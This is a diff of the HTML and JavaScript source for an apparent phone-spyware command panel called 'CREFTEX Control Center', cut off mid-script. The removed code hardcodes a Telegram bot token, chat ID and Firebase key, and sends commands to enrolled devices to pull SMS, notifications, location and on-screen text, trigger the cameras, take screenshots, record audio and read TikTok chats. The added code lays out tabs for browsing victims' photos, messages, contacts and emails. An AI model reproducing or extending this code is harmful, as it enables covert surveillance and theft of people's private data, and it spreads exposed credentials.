@@ -1,293 +1,768 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
-<title>CREFTEX — Control Center</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
-<style>
-:root{--bg0:#0e1621;--bg1:#17212b;--bg2:#1e2c3a;--bg3:#242f3e;--line:rgba(125,160,200,.13);--lineh:rgba(125,160,200,.32);--tx:#e8eef5;--txd:#8ea3b8;--txm:#5d7186;--ac:#2aabee;--ac2:#0088cc;--acg:rgba(42,171,238,.32);--ok:#4ecb71;--okg:rgba(78,203,113,.25);--wn:#f2a93b;--dg:#e35d5d;--pu:#8774e1;--r:18px;--rs:12px;--rx:10px}
-*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-html,body{height:100%}
-body{font-family:'Cairo',sans-serif;background:var(--bg0);color:var(--tx);min-height:100vh;padding:14px 14px 60px;overflow-x:hidden}
-body:before{content:'';position:fixed;inset:0;background:radial-gradient(circle at 15% 10%,rgba(42,171,238,.1),transparent 40%),radial-gradient(circle at 85% 90%,rgba(0,136,204,.08),transparent 40%),radial-gradient(circle at 50% 50%,rgba(135,116,225,.05),transparent 60%);pointer-events:none}
-.app{position:relative;max-width:1400px;margin:0 auto}
-.hd{display:flex;align-items:center;justify-content:space-between;gap:14px;padding:16px 24px;background:linear-gradient(135deg,#1e2c3a,#17212b);border:1px solid var(--line);border-radius:var(--r);margin-bottom:14px;box-shadow:0 10px 30px rgba(0,0,0,.35);flex-wrap:wrap}
-.brand{display:flex;align-items:center;gap:12px}
-.logo{width:44px;height:44px;border-radius:50%;background:linear-gradient(135deg,var(--ac),var(--ac2));display:flex;align-items:center;justify-content:center;font-size:20px;box-shadow:0 8px 24px var(--acg)}
-.brand h1{font-size:19px;font-weight:800;letter-spacing:.3px;background:linear-gradient(135deg,#6ec6f5,#2aabee);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
-.brand p{font-size:11px;color:var(--txm);letter-spacing:.5px}
-.hd-t{font-size:12px;font-weight:700;color:var(--txd);padding:6px 14px;background:rgba(42,171,238,.1);border:1px solid rgba(42,171,238,.22);border-radius:20px}
-.stats{display:flex;gap:14px}
-.st{text-align:center;padding:7px 16px;background:rgba(14,22,33,.7);border:1px solid var(--line);border-radius:var(--rx);min-width:80px}
-.st .n{font-size:19px;font-weight:800;color:var(--ac);font-family:'JetBrains Mono',monospace}
-.st .n.ok{color:var(--ok)}
-.st .l{font-size:10px;color:var(--txm);text-transform:uppercase;letter-spacing:.5px}
-.tabs{display:flex;gap:8px;padding:8px;background:linear-gradient(135deg,rgba(30,44,58,.9),rgba(23,33,43,.85));border:1px solid var(--line);border-radius:var(--r);margin-bottom:20px;overflow-x:auto;scrollbar-width:none;position:sticky;top:10px;z-index:50;backdrop-filter:blur(20px)}
-.tabs::-webkit-scrollbar{display:none}
-.tab{flex-shrink:0;display:flex;align-items:center;gap:7px;padding:10px 18px;border-radius:12px;border:1px solid transparent;background:transparent;color:var(--txd);font-family:inherit;font-size:13px;font-weight:700;cursor:pointer;transition:all .18s;white-space:nowrap}
-.tab .ic{font-size:15px}
-.tab:hover{background:rgba(42,171,238,.09);color:var(--tx)}
-.tab.on{background:linear-gradient(135deg,rgba(42,171,238,.28),rgba(0,136,204,.16));border-color:rgba(42,171,238,.45);color:#fff;box-shadow:0 4px 16px rgba(42,171,238,.22)}
-.panel{background:linear-gradient(180deg,rgba(30,44,58,.85),rgba(23,33,43,.92));border:1px solid var(--line);border-radius:var(--r);padding:22px;margin-bottom:20px}
-.fw{width:100vw;margin-left:calc(50% - 50vw);margin-right:calc(50% - 50vw);border-radius:0;border-left:none;border-right:none;padding:22px 26px}
-.p-head{display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;padding-bottom:14px;border-bottom:1px solid var(--line);flex-wrap:wrap;gap:10px}
-.p-title{font-size:16px;font-weight:700;display:flex;align-items:center;gap:10px}
-.p-title .ic{font-size:19px}
-.cnt{background:rgba(42,171,238,.16);color:var(--ac);padding:2px 10px;border-radius:20px;font-size:11px;font-weight:700}
-.ibtn{width:32px;height:32px;border-radius:10px;background:rgba(42,171,238,.1);border:1px solid rgba(42,171,238,.25);color:var(--ac);display:inline-flex;align-items:center;justify-content:center;cursor:pointer;transition:all .15s;font-size:14px}
-.ibtn:active{transform:scale(.9)}
-.devs{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px}
-.dc{background:linear-gradient(135deg,rgba(36,47,62,.7),rgba(30,44,58,.5));border:1px solid var(--line);border-radius:var(--rs);padding:15px;cursor:pointer;transition:all .2s;position:relative;overflow:hidden}
-.dc:before{content:'';position:absolute;top:0;right:0;width:4px;height:100%;background:var(--txm)}
-.dc.act:before{background:var(--ok);box-shadow:0 0 12px var(--okg)}
-.dc.ina:before{background:var(--dg)}
-.dc.sel{border-color:var(--ac);box-shadow:0 0 0 2px var(--acg),0 8px 24px rgba(42,171,238,.16)}
-.dc:hover{border-color:var(--lineh)}
-.dr1{display:flex;align-items:center;justify-content:space-between;margin-bottom:9px}
-.dn{font-size:14.5px;font-weight:700;display:flex;align-items:center;gap:8px;flex:1;min-width:0}
-.dn input{background:none;border:none;color:var(--tx);font-family:inherit;font-size:14.5px;font-weight:700;width:100%;outline:none;padding:2px 4px;border-radius:6px}
-.dn input:focus{background:rgba(42,171,238,.15);box-shadow:0 0 0 1px var(--ac)}
-.pill{padding:3px 9px;border-radius:20px;font-size:10px;font-weight:700;flex-shrink:0}
-.pill.act{background:rgba(78,203,113,.15);color:var(--ok);border:1px solid rgba(78,203,113,.3)}
-.pill.ina{background:rgba(227,93,93,.1);color:var(--dg);border:1px solid rgba(227,93,93,.25)}
-.dr2{display:flex;flex-direction:column;gap:3px;font-size:11px;color:var(--txm);font-family:'JetBrains Mono',monospace;direction:ltr;text-align:left}
-.dr2 b{color:var(--txd);font-weight:500;font-family:'Cairo',sans-serif}
-.empty{text-align:center;padding:50px 20px;color:var(--txm)}
-.empty .ic{font-size:50px;margin-bottom:10px;opacity:.4}
-.empty p{font-size:13px}
-.cbs5{display:grid;grid-template-columns:repeat(5,1fr);gap:9px}
-.cb{padding:13px 12px;border-radius:12px;border:1px solid transparent;background:linear-gradient(135deg,rgba(36,47,62,.7),rgba(30,44,58,.45));color:var(--tx);font-family:inherit;font-size:13px;font-weight:600;cursor:pointer;transition:all .15s;display:flex;align-items:center;justify-content:center;gap:8px;text-align:center}
-.cb .ic{font-size:17px;flex-shrink:0}
-.cb:hover{border-color:var(--lineh);background:linear-gradient(135deg,rgba(46,60,79,.8),rgba(36,47,62,.6))}
-.cb:active{transform:scale(.97)}
-.cb.p{border-color:rgba(42,171,238,.35)}.cb.s{border-color:rgba(78,203,113,.35)}.cb.w{border-color:rgba(242,169,59,.35)}.cb.d{border-color:rgba(227,93,93,.35)}.cb.v{border-color:rgba(135,116,225,.35)}
-.seldev{margin-top:16px;padding:13px 16px;background:rgba(42,171,238,.08);border:1px solid rgba(42,171,238,.25);border-radius:var(--rs);display:flex;align-items:center;justify-content:space-between;gap:10px;flex-wrap:wrap;font-size:13.5px}
-.selbar{display:flex;align-items:center;gap:10px;flex-wrap:wrap}
-.selbar select{background:rgba(14,22,33,.85);border:1px solid var(--lineh);color:var(--tx);font-family:inherit;font-size:13px;font-weight:600;padding:9px 14px;border-radius:10px;outline:none;cursor:pointer;max-width:240px}
-.selbar select:focus{border-color:var(--ac)}
-.clr{padding:8px 15px;border-radius:10px;background:rgba(227,93,93,.1);border:1px solid rgba(227,93,93,.3);color:var(--dg);font-family:inherit;font-size:12px;font-weight:700;cursor:pointer}
-.clr:active{transform:scale(.95)}
-.qa{display:flex;gap:10px;flex-wrap:wrap;margin-bottom:18px}
-.lg-body{background:#0a121c;border:1px solid var(--line);border-radius:var(--rs);padding:18px;min-height:65vh;max-height:80vh;overflow-y:auto}
-.lg-body::-webkit-scrollbar{width:8px}
-.lg-body::-webkit-scrollbar-thumb{background:var(--lineh);border-radius:4px}
-.le{display:flex;gap:13px;padding:13px 15px;margin-bottom:10px;background:rgba(30,44,58,.5);border:1px solid var(--line);border-radius:12px;animation:fu .35s ease;position:relative}
-@keyframes fu{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}
-.le:before{content:'';position:absolute;right:0;top:0;bottom:0;width:3px;border-radius:0 12px 12px 0;background:var(--ac)}
-.le.fb:before{background:var(--ac)}
-.le.fu:before{background:var(--ok)}
-.le.fp:before{background:var(--pu)}
-.le .av{width:36px;height:36px;border-radius:10px;background:linear-gradient(135deg,var(--ac),var(--ac2));display:flex;align-items:center;justify-content:center;font-size:17px;flex-shrink:0}
-.le.fu .av{background:linear-gradient(135deg,var(--ok),#3aa85c)}
-.le.fp .av{background:linear-gradient(135deg,var(--pu),var(--ac))}
-.le .co{flex:1;min-width:0}
-.le .mt{display:flex;align-items:center;gap:10px;margin-bottom:5px}
-.le .who{font-size:12px;font-weight:700;color:var(--txd)}
-.le .whn{font-size:11px;color:var(--txm);font-family:'JetBrains Mono',monospace;direction:ltr}
-.le .bd{font-size:13.5px;line-height:1.7;white-space:pre-wrap;word-break:break-word}
-.le .bd img{max-width:100%;max-height:500px;border-radius:10px;margin-top:8px;border:1px solid var(--line);display:block;cursor:pointer}
-.le .bd audio,.le .bd video{width:100%;margin-top:8px;border-radius:10px}
-.lemp{text-align:center;padding:80px 20px;color:var(--txm)}
-.lemp .ic{font-size:56px;margin-bottom:14px;opacity:.3}
-.toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%) translateY(100px);padding:13px 22px;border-radius:14px;font-size:13.5px;font-weight:700;background:rgba(23,33,43,.96);border:1px solid var(--lineh);backdrop-filter:blur(20px);transition:transform .3s;z-index:9999;box-shadow:0 12px 40px rgba(0,0,0,.5);max-width:90%}
-.toast.show{transform:translateX(-50%) translateY(0)}
-.toast.ok{border-color:rgba(78,203,113,.5);color:var(--ok)}
-.toast.err{border-color:rgba(227,93,93,.5);color:var(--dg)}
-.toast.wait{border-color:rgba(42,171,238,.5);color:var(--ac)}
-.modal{position:fixed;inset:0;background:rgba(0,0,0,.96);z-index:99999;display:none;align-items:center;justify-content:center;padding:40px}
-.modal.show{display:flex}
-.modal img{max-width:100%;max-height:90vh;border-radius:16px;box-shadow:0 20px 80px rgba(0,0,0,.8)}
-.mx{position:absolute;top:24px;right:24px;width:44px;height:44px;border-radius:50%;background:rgba(255,255,255,.1);border:1px solid rgba(255,255,255,.15);color:#fff;font-size:22px;cursor:pointer}
-@media(max-width:1100px){.cbs5{grid-template-columns:repeat(4,1fr)}}
-@media(max-width:900px){.cbs5{grid-template-columns:repeat(3,1fr)}}
-@media(max-width:640px){
-body{padding:8px 8px 50px}
-.hd{padding:12px 14px}
-.stats{gap:7px}
-.st{padding:6px 11px;min-width:64px}
-.st .n{font-size:16px}
-.tabs{padding:6px;gap:6px}
-.tab{padding:8px 13px;font-size:12px}
-.panel{padding:15px}
-.fw{padding:14px 12px}
-.cbs5{grid-template-columns:repeat(2,1fr)}
-.lg-body{padding:11px;min-height:55vh}
-.devs{grid-template-columns:1fr}
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=1180, initial-scale=1.0">
+    <title>CREFTEX — Control Center</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0f1a;
+            --card: #131e2f;
+            --card-2: #1a2840;
+            --border: #22344d;
+            --text: #e8eef8;
+            --dim: #7c8db0;
+            --accent: #3b82f6;
+            --cyan: #22d3ee;
+            --green: #10b981;
+            --purple: #8b5cf6;
+            --red: #ef4444;
+            --yellow: #f59e0b;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
+        body {
+            background: linear-gradient(180deg, #0a0f1a, #050810);
+            color: var(--text);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        .app { width: 1180px; max-width: 100%; margin: 0 auto; }
+
+        /* Header */
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 24px;
+            background: rgba(19, 30, 47, 0.8);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            margin-bottom: 20px;
+        }
+        .brand { display: flex; align-items: center; gap: 14px; }
+        .brand-logo {
+            width: 50px; height: 50px;
+            border-radius: 14px;
+            background: linear-gradient(135deg, var(--accent), var(--cyan));
+            display: flex; align-items: center; justify-content: center;
+            font-size: 24px;
+        }
+        .brand h1 {
+            font-size: 22px; font-weight: 800;
+            background: linear-gradient(135deg, #60a5fa, #22d3ee);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+        }
+        .brand p { font-size: 12px; color: var(--dim); }
+
+        /* Stats */
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 14px;
+            margin-bottom: 20px;
+        }
+        .stat {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 18px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+        }
+        .stat .icon {
+            width: 46px; height: 46px;
+            border-radius: 12px;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 22px;
+            background: rgba(59, 130, 246, 0.15);
+        }
+        .stat .info { flex: 1; }
+        .stat .num {
+            font-size: 28px; font-weight: 800;
+            color: var(--cyan);
+        }
+        .stat .lbl { font-size: 12px; color: var(--dim); }
+
+        /* Devices List */
+        .section-title {
+            display: flex; align-items: center; gap: 10px;
+            font-size: 18px; font-weight: 700;
+            margin: 24px 0 14px;
+        }
+        .section-title .count {
+            background: var(--accent);
+            color: #fff;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+        }
+        .devices {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 14px;
+            margin-bottom: 24px;
+        }
+        .device {
+            background: linear-gradient(160deg, #142231 0%, #131e30 60%, #1b1830 100%);
+            border: 2px solid transparent;
+            background-clip: padding-box;
+            border-radius: 20px;
+            padding: 18px;
+            cursor: pointer;
+            position: relative;
+            transition: all 0.2s;
+        }
+        .device::before {
+            content: ""; position: absolute; inset: -2px;
+            border-radius: 22px; z-index: -1;
+            background: linear-gradient(120deg, #00afff, #2e7fe8 40%, #8b3dff 75%, #b33cff);
+        }
+        .device.inactive::before {
+            background: linear-gradient(120deg, #5a2020, #8b2d2d 40%, #b33c3c 75%, #d84c4c);
+        }
+        .device:hover { transform: translateY(-3px); }
+        .device .status {
+            position: absolute; top: 12px; left: 12px;
+            width: 10px; height: 10px;
+            border-radius: 50%;
+            background: var(--green);
+            box-shadow: 0 0 12px rgba(16, 185, 129, 0.9);
+        }
+        .device.inactive .status {
+            background: var(--red);
+            box-shadow: 0 0 12px rgba(239, 68, 68, 0.9);
+        }
+        .device .name {
+            font-size: 17px; font-weight: 800;
+            margin-bottom: 8px;
+            direction: ltr;
+            text-align: left;
+        }
+        .device .meta {
+            font-size: 12px; color: var(--dim);
+            direction: ltr;
+            text-align: left;
+            font-family: 'Courier New', monospace;
+        }
+
+        /* Device Detail Panel */
+        .detail {
+            display: none;
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 24px;
+            margin-bottom: 20px;
+        }
+        .detail.open { display: block; }
+        .detail-head {
+            display: flex; justify-content: space-between; align-items: center;
+            padding-bottom: 16px;
+            border-bottom: 1px solid var(--border);
+            margin-bottom: 20px;
+        }
+        .detail-title { display: flex; align-items: center; gap: 14px; }
+        .detail-title .avatar {
+            width: 60px; height: 60px;
+            border-radius: 16px;
+            background: linear-gradient(135deg, var(--accent), var(--cyan));
+            display: flex; align-items: center; justify-content: center;
+            font-size: 28px;
+        }
+        .detail-title h2 { font-size: 20px; }
+        .detail-title p { font-size: 12px; color: var(--dim); direction: ltr; }
+        .close-btn {
+            padding: 8px 16px;
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid rgba(239, 68, 68, 0.4);
+            color: var(--red);
+            border-radius: 10px;
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+        }
+
+        /* Tabs */
+        .tabs {
+            display: flex; gap: 8px;
+            margin-bottom: 18px;
+            flex-wrap: wrap;
+        }
+        .tab {
+            padding: 10px 18px;
+            background: var(--card-2);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            color: var(--dim);
+            font-size: 13px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: inherit;
+            display: flex; align-items: center; gap: 6px;
+        }
+        .tab.on {
+            background: linear-gradient(135deg, var(--accent), #2563eb);
+            color: #fff;
+            border-color: var(--accent);
+        }
+
+        /* Tab Content */
+        .tab-content {
+            display: none;
+        }
+        .tab-content.on { display: block; }
+
+        /* Gallery (Images Grid) */
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(4, 1fr);
+            gap: 10px;
+        }
+        .gallery img {
+            width: 100%;
+            aspect-ratio: 1;
+            object-fit: cover;
+            border-radius: 12px;
+            cursor: pointer;
+            border: 1px solid var(--border);
+            transition: transform 0.15s;
+        }
+        .gallery img:hover { transform: scale(1.03); }
+
+        /* List (for SMS, contacts, etc.) */
+        .list {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            max-height: 600px;
+            overflow-y: auto;
+        }
+        .list-item {
+            background: var(--card-2);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 14px;
+            font-size: 14px;
+        }
+        .list-item .title {
+            font-weight: 700;
+            color: var(--cyan);
+            margin-bottom: 6px;
+        }
+        .list-item .text {
+            color: var(--text);
+            line-height: 1.6;
+            font-size: 13px;
+        }
+        .list-item .meta {
+            font-size: 11px;
+            color: var(--dim);
+            margin-top: 6px;
+        }
+
+        .empty {
+            text-align: center;
+            padding: 60px 20px;
+            color: var(--dim);
+        }
+        .empty .icon { font-size: 60px; margin-bottom: 12px; opacity: 0.4; }
+
+        /* Modal for full image */
+        .modal {
+            position: fixed; inset: 0;
+            background: rgba(0, 0, 0, 0.95);
+            display: none;
+            align-items: center; justify-content: center;
+            z-index: 9999;
+            padding: 30px;
+        }
+        .modal.show { display: flex; }
+        .modal img { max-width: 100%; max-height: 90vh; border-radius: 16px; }
+        .modal-close {
+            position: absolute; top: 20px; right: 20px;
+            width: 44px; height: 44px;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.1);
+            border: none;
+            color: #fff;
+            font-size: 24px;
+            cursor: pointer;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 24px; left: 50%;
+            transform: translateX(-50%) translateY(100px);
+            padding: 14px 24px;
+            border-radius: 14px;
+            background: rgba(19, 30, 47, 0.95);
+            border: 1px solid var(--border);
+            font-size: 14px;
+            font-weight: 700;
+            transition: transform 0.3s;
+            z-index: 9999;
+        }
+        .toast.show { transform: translateX(-50%) translateY(0); }
+        .toast.ok { border-color: var(--green); color: var(--green); }
+        .toast.err { border-color: var(--red); color: var(--red); }
+    </style>
 </head>
 <body>
 <div class="app">
-  <header class="hd">
-    <div class="brand"><div class="logo">⚡</div><div><h1>CREFTEX</h1><p>CONTROL CENTER</p></div></div>
-    <div class="hd-t">🛰 شريط المعلومات العام</div>
-    <div class="stats">
-      <div class="st"><div class="n" id="statDevices">0</div><div class="l">أجهزة</div></div>
-      <div class="st"><div class="n ok" id="statActive">0</div><div class="l">نشطة</div></div>
-      <div class="st"><div class="n" id="statMsgs">0</div><div class="l">رسائل</div></div>
+    <!-- Header -->
+    <div class="header">
+        <div class="brand">
+            <div class="brand-logo">⚡</div>
+            <div>
+                <h1>CREFTEX</h1>
+                <p>CONTROL CENTER</p>
+            </div>
+        </div>
+        <button class="close-btn" onclick="loadAll()">🔄 تحديث</button>
     </div>
-  </header>
-  <nav class="tabs" id="tabs"></nav>
-  <main id="view"></main>
+
+    <!-- Stats -->
+    <div class="stats">
+        <div class="stat">
+            <div class="icon">📱</div>
+            <div class="info">
+                <div class="num" id="statDevices">0</div>
+                <div class="lbl">الأجهزة</div>
+            </div>
+        </div>
+        <div class="stat">
+            <div class="icon" style="background: rgba(34, 211, 238, 0.15);">📸</div>
+            <div class="info">
+                <div class="num" id="statPhotos" style="color: var(--cyan);">0</div>
+                <div class="lbl">الصور</div>
+            </div>
+        </div>
+        <div class="stat">
+            <div class="icon" style="background: rgba(139, 92, 246, 0.15);">💬</div>
+            <div class="info">
+                <div class="num" id="statMessages" style="color: var(--purple);">0</div>
+                <div class="lbl">الرسائل</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Devices List -->
+    <div class="section-title">
+        <span>📱 الأجهزة</span>
+        <span class="count" id="deviceCount">0</span>
+    </div>
+    <div class="devices" id="devicesList">
+        <div class="empty" style="grid-column: 1/-1;">
+            <div class="icon">📭</div>
+            <div>لا أجهزة مسجّلة بعد</div>
+        </div>
+    </div>
+
+    <!-- Device Detail -->
+    <div class="detail" id="detail">
+        <div class="detail-head">
+            <div class="detail-title">
+                <div class="avatar" id="detailAvatar">📱</div>
+                <div>
+                    <h2 id="detailName">—</h2>
+                    <p id="detailId">—</p>
+                </div>
+            </div>
+            <button class="close-btn" onclick="closeDetail()">✕ إغلاق</button>
+        </div>
+
+        <div class="tabs">
+            <button class="tab on" onclick="switchTab(this, 'photos')">📸 الصور</button>
+            <button class="tab" onclick="switchTab(this, 'sms')">📩 SMS</button>
+            <button class="tab" onclick="switchTab(this, 'contacts')">👥 جهات الاتصال</button>
+            <button class="tab" onclick="switchTab(this, 'emails')">📧 الإيميلات</button>
+            <button class="tab" onclick="switchTab(this, 'music')">🎵 الموسيقى</button>
+            <button class="tab" onclick="switchTab(this, 'location')">📍 الموقع</button>
+        </div>
+
+        <div class="tab-content on" id="tab-photos">
+            <div class="gallery" id="photosGrid"></div>
+        </div>
+
+        <div class="tab-content" id="tab-sms">
+            <div class="list" id="smsList"></div>
+        </div>
+
+        <div class="tab-content" id="tab-contacts">
+            <div class="list" id="contactsList"></div>
+        </div>
+
+        <div class="tab-content" id="tab-emails">
+            <div class="list" id="emailsList"></div>
+        </div>
+
+        <div class="tab-content" id="tab-music">
+            <div class="list" id="musicList"></div>
+        </div>
+
+        <div class="tab-content" id="tab-location">
+            <div class="list" id="locationList"></div>
+        </div>
+    </div>
 </div>
+
+<!-- Image Modal -->
+<div class="modal" id="imgModal" onclick="closeModal()">
+    <button class="modal-close">×</button>
+    <img id="modalImg" src="" alt="">
+</div>
+
+<!-- Toast -->
 <div class="toast" id="toast"></div>
-<div class="modal" id="imgModal" onclick="closeModal()"><button class="mx" onclick="closeModal()">×</button><img id="modalImg"></div>
+
 <script>
-const TELEGRAM_BOT_TOKEN="8965774628:AAHiRk5BzVgGXJOMURMJyNNjHnpDj7MUAjM",TELEGRAM_CHAT_ID="8599240795",FIREBASE_API_KEY="AIzaSyBvzfJOOjRFZnTgTUrwEZQPr8Ba7zKKlNg",FIREBASE_PROJECT_ID="hhhxh-5ebe4";
-const TG_API=`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`,TG_FILE=`https://api.telegram.org/file/bot${TELEGRAM_BOT_TOKEN}`,FS_DEVICES=`https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/devices`,FS_MESSAGES=`https://firestore.googleapis.com/v1/projects/${FIREBASE_PROJECT_ID}/databases/(default)/documents/messages`;
-let lastUpdateId=0,messageCache={},selectedDevice=null,allMessages=[],currentTab='home',devices=[],deviceNames=JSON.parse(localStorage.getItem('device_names')||'{}');
-const SEC={
- home:{ic:'🏠',lb:'الرئيسية'},
- photos:{ic:'🖼',lb:'الصور',cmds:[['/photos','📸','كل الصور','p'],['/photos 50','🖼','آخر 50 صورة','p']],kw:['/photos','صور','صورة','📸','🖼'],photo:true},
- sms:{ic:'📩',lb:'الرسائل',cmds:[['/sms','📩','كل الرسائل SMS','s']],kw:['/sms','sms','رسالة','رسائل','📩']},
- notifs:{ic:'🔔',lb:'الإشعارات',cmds:[['/notifs','🔔','كل الإشعارات','s']],kw:['/notifs','notif','إشعار','إشعارات','🔔']},
- info:{ic:'📊',lb:'معلومات الجهاز',cmds:[['/info','📊','معلومات الجهاز','p']],kw:['/info','معلومات','الجهاز','📊']},
- loc:{ic:'📍',lb:'الموقع',cmds:[['/location','📍','الموقع الحالي','s']],kw:['/location','موقع','📍','gps','خرائط']},
- acc:{ic:'📝',lb:'النصوص على الشاشة',cmds:[['/accessibility','📝','نصوص الشاشة','v']],kw:['/accessibility','نصوص','الشاشة','📝']},
- audio:{ic:'🎤',lb:'الأصوات',cmds:[['/audio_start','🎤','بدء التسجيل','s'],['/audio_stop','⏹','إيقاف التسجيل','d']],kw:['/audio','صوت','صوتي','تسجيل','🎤','voice','audio']},
- cam:{ic:'📸',lb:'الكاميرا',cmds:[['/cam_front','🤳','كاميرا أمامية','v'],['/cam_back','📸','كاميرا خلفية','v'],['/screen','📷','لقطة شاشة','w'],['/video','📹','تسجيل فيديو','w'],['/screen_stop','🛑','إيقاف اللقطات','d']],kw:['/cam','/screen','/video','كاميرا','لقطة','فيديو','🤳','📷','📹','🛑']}
-};
-const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
-function toast(m,t='wait'){const e=document.getElementById('toast');e.textContent=m;e.className='toast show '+t;clearTimeout(window.__tm);window.__tm=setTimeout(()=>e.classList.remove('show'),3000)}
-function renderTabs(){document.getElementById('tabs').innerHTML=Object.entries(SEC).map(([k,v])=>`<button class="tab ${currentTab===k?'on':''}" onclick="setTab('${k}')"><span class="ic">${v.ic}</span>${v.lb}</button>`).join('')}
-function setTab(k){currentTab=k;renderTabs();renderView()}
-function renderView(){const v=document.getElementById('view');if(currentTab==='home')v.innerHTML=homeHTML();else v.innerHTML=secHTML(currentTab);fillDevices();renderCurrentLog()}
-function homeHTML(){const B=(c,i,l,cl)=>`<button class="cb ${cl}" onclick="sendCmd('${c}')"><span class="ic">${i}</span>${l}</button>`;return `
-<div class="panel">
- <div class="p-head"><div class="p-title"><span class="ic">📱</span>الأجهزة <span class="cnt" id="devCount">0</span></div><div class="ibtn" onclick="loadDevices()" title="تحديث">🔄</div></div>
- <div class="devs" id="devicesList"></div>
-</div>
-<div class="panel">
- <div class="p-head"><div class="p-title"><span class="ic">🎮</span>الأوامر</div></div>
- <div class="cbs5">
-  ${B('/photos','📸','كل الصور','p')}${B('/photos 50','🖼','آخر 50 صورة','p')}${B('/sms','📩','كل الرسائل SMS','s')}${B('/notifs','🔔','كل الإشعارات','s')}${B('/accessibility','📝','نصوص الشاشة','v')}
-  ${B('/info','📊','معلومات الجهاز','p')}${B('/location','📍','الموقع الحالي','s')}${B('/screen','📷','لقطة شاشة','w')}${B('/video','📹','تسجيل فيديو','w')}${B('/menu','📋','القائمة الكاملة','p')}
-  ${B('/cam_front','🤳','كاميرا أمامية','v')}${B('/cam_back','📸','كاميرا خلفية','v')}${B('/audio_start','🎤','بدء التسجيل','s')}${B('/audio_stop','⏹','إيقاف التسجيل','d')}${B('/screen_stop','🛑','إيقاف اللقطات','d')}
-  ${B('/tiktok','🎵','فتح تيك توك','p')}${B('/tiktok_messages','💬','المحادثات','s')}${B('/tiktok_read','👁','قراءة الشاشة','v')}
- </div>
- <div class="seldev">${selectedDevice?`<span>📱 الجهاز المحدد: <b>${esc(devName(selectedDevice))}</b></span><button class="clr" onclick="clearSelection()">✕ إلغاء التحديد</button>`:'<span style="color:var(--txm)">⚠️ لم يتم اختيار جهاز — اختر جهازًا من الأعلى</span>'}</div>
-</div>
-<div style="height:90px"></div>`}
-function secHTML(k){const s=SEC[k];return `
-<div class="panel">
- <div class="p-head">
-  <div class="p-title"><span class="ic">${s.ic}</span>${s.lb}</div>
-  <div class="selbar">
-   <select id="devPick" onchange="pickDevice(this.value)"><option value="">— اختر جهازًا —</option></select>
-   ${selectedDevice?'<button class="clr" onclick="clearSelection()">✕</button>':''}
-   <div class="ibtn" onclick="loadMessages(true)" title="تحديث">🔄</div>
-  </div>
- </div>
- <div class="qa">${s.cmds.map(c=>`<button class="cb ${c[3]}" style="flex:1;min-width:150px" onclick="sendCmd('${c[0]}')"><span class="ic">${c[1]}</span>${c[2]}</button>`).join('')}</div>
- ${logPanelHTML('سجل: '+s.lb)}
-</div>`}
-function logPanelHTML(t){return `
-<div class="panel fw" style="margin-bottom:0">
- <div class="p-head"><div class="p-title"><span class="ic">💬</span>${t}</div><div class="ibtn" onclick="loadMessages(true)" title="تحديث">🔄</div></div>
- <div class="lg-body" id="logBody"></div>
-</div>`}
-const devName=d=>deviceNames[d.id]||`${d.manufacturer} ${d.model}`;
-function fillDevices(){
- const list=document.getElementById('devicesList');
- if(list){
-  document.getElementById('devCount').textContent=devices.length;
-  list.innerHTML=devices.length?devices.map(d=>{const ls=d.lastSeen>0?new Date(d.lastSeen).toLocaleString('ar-EG',{hour:'2-digit',minute:'2-digit',day:'2-digit',month:'2-digit'}):'—';return `
-  <div class="dc ${d.isActive?'act':'ina'} ${selectedDevice&&selectedDevice.id===d.id?'sel':''}" onclick="selectDevice('${esc(d.id)}')">
-   <div class="dr1">
-    <div class="dn"><span>📱</span><input type="text" value="${esc(devName(d))}" placeholder="${esc(d.manufacturer+' '+d.model)}" onclick="event.stopPropagation()" onchange="renameDevice(this,'${esc(d.id)}')"></div>
